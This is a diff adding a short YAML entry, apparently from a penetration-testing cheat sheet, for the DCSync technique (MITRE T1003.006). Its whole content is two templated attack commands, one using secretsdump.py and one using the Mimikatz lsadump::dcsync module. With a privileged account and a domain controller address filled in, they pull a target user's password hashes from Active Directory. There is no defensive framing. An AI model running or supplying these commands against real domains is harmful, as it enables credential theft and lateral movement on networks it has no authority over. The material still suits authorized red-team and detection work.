@@ -1,0 +1,15 @@
+name: "DCSync"
+mitre_technique_id: "T1003.006"
+sections:
+- title: "DC Sync"
+  tabs:
+  - title: "secretsdump.py"
+    content: |
+      ```
+      secretsdump.py -just-dc-user {{TARGET_DOMAIN_USER}} {{DOMAIN_NAME}}/{{HIGHPRIVILEGED_DOMAIN_USER}}:{{HIGHPRIVILEGED_DOMAIN_USER_PASSWORD}}@{{DC_IP}}
+      ```
+  - title: "Mimikatz"
+    content: |
+      ```
+      lsadump::dcsync /user:{{TARGET_DOMAIN_USER}} /domain:{{DOMAIN_NAME}} /dc:{{DC_IP}}
+      ```
